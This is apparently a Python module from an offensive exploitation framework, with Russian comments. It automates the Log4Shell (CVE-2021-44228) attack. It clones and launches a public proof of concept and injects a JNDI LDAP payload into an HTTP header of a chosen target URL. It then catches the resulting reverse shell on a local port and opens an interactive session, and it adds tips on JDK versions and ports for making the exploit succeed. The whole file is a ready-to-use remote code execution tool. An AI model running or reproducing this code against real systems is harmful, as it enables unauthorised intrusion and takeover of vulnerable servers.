"""Log4Shell (CVE-2021-44228) — обёртка над kozmer/log4j-shell-poc.

ТРЕБОВАНИЯ:

    git, python3

    JDK 1.8.0_20 (именно эта версия нужна для загрузки удалённых классов;
    более новые JDK блокируют trustURLCodebase).

    Целевой JVM должен разрешать remote class loading.
    """
import sys, subprocess, time, socket, urllib.request, re
from pathlib import Path
from framework import Module, C, interactive_shell, require

POC_REPO = "https://github.com/kozmer/log4j-shell-poc.git"
WORK_DIR = Path.home() / ".rce-tool" / "log4j-shell-poc"
REQUIRED_JAVA = "1.8.0_20"


class Log4Shell(Module):
    name = "log4shell"
    description = "CVE-2021-44228 Log4j JNDI RCE (kozmer PoC, требует JDK 1.8.0_20)"
    author = "you"

    options = {
        "TARGET": {"value": None, "required": True, "description": "Target URL, e.g. http://10.10.10.5:8080"},
        "ENDPOINT": {"value": "/", "required": False, "description": "Path to hit, e.g. /login"},
        "LHOST": {"value": None, "required": True, "description": "Your IP (reachable from target)"},
        "LPORT": {"value": "4444","required": True, "description": "Reverse-shell port"},
        "HEADER": {"value": "User-Agent","required": False,"description": "HTTP header to inject"},
        "WEBPORT": {"value": "8000","required": False,"description": "HTTP port for Exploit.class"},
        "JAVA": {"value": "java","required": False,"description": "java binary"},
        "JAVAC": {"value": "javac","required": False,"description": "javac binary"},
    }

    def _check_java(self) -> bool:
        try:
            r = subprocess.run([self.get("JAVA"), "-version"],
                               capture_output=True, text=True)
            out = (r.stderr or "") + (r.stdout or "")
            m = re.search(r'version "([^"]+)"', out)
            ver = m.group(1) if m else "unknown"
            if ver != REQUIRED_JAVA:
                print(f"{C.Y}[!] Java version: {ver} (рекомендуется {REQUIRED_JAVA})")
                print(f"{C.DIM} Более новые JDK блокируют загрузку удалённых классов.")
                print(f" Если shell не придёт — установи OpenJDK {REQUIRED_JAVA}.{C.END}")
            else:
                print(f"{C.G}[+] Java {ver} — OK{C.END}")
            return True
        except FileNotFoundError:
            print(f"{C.R}[!] '{self.get('JAVA')}' не найден.{C.END}")
            return False

    def _ensure_poc(self) -> bool:
        if (WORK_DIR / "poc.py").exists():
            return True
        WORK_DIR.parent.mkdir(parents=True, exist_ok=True)
        print(f"{C.Y}[*] Cloning {POC_REPO}{C.END}")
        r = subprocess.run(["git", "clone", "--depth", "1", POC_REPO, str(WORK_DIR)],
                           capture_output=True, text=True)
        if r.returncode != 0:
            print(f"{C.R}[!] git clone failed: {r.stderr}{C.END}")
            return False
        return True

    def _install_requirements(self) -> None:
        req = WORK_DIR / "requirements.txt"
        if req.exists():
            print(f"{C.Y}[*] Installing PoC requirements...{C.END}")
            subprocess.run([sys.executable, "-m", "pip", "install", "-q", "-r", str(req)],
                           check=False)

    def run(self):
        miss = require("git", self.get("JAVA"), self.get("JAVAC"))
        if miss:
            print(f"{C.R}[!] Missing: {', '.join(miss)}{C.END}")
            return
        if not self._check_java():
            return
        if not self._ensure_poc():
            return
        self._install_requirements()

        lh = self.get("LHOST")
        lp = self.get("LPORT")
        web = self.get("WEBPORT")
        target = self.get("TARGET").rstrip("/")
        endpoint = self.get("ENDPOINT") or "/"
        header = self.get("HEADER")

        cmd = [sys.executable, "poc.py", "--userip", lh, "--webport", web, "--lport", lp]
        print(f"{C.Y}[*] Starting PoC: {' '.join(cmd)}{C.END}")
        poc = subprocess.Popen(cmd, cwd=str(WORK_DIR))
        time.sleep(3)

        jndi = f"${{jndi:ldap://{lh}:1389/a}}"
        url = target + endpoint
        print(f"{C.Y}[] Sending to {url} ({header}: {jndi}){C.END}")
        try:
            urllib.request.urlopen(
                urllib.request.Request(url, headers={header: jndi}), timeout=5).read()
        except Exception as e:
            print(f"{C.DIM}[] HTTP result: {e}{C.END}")

        print(f"{C.Y}[] Waiting for shell on {lh}:{lp} (60s)...{C.END}")
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", int(lp)))
        srv.listen(1)
        srv.settimeout(60)
        try:
            cl, ad = srv.accept()
            print(f"{C.G}[+] Connection from {ad[0]}:{ad[1]}{C.END}")
            interactive_shell(cl)
        except socket.timeout:
            print(f"{C.R}[!] No connection in 60s.{C.END}")
            print(f"{C.DIM} Проверь: JDK на таргете (>=8u191 блокирует), LHOST доступен, порт 1389 открыт.{C.END}")
        finally:
            srv.close()
            poc.terminate()
            print(f"{C.Y}[] PoC stopped.{C.END}")
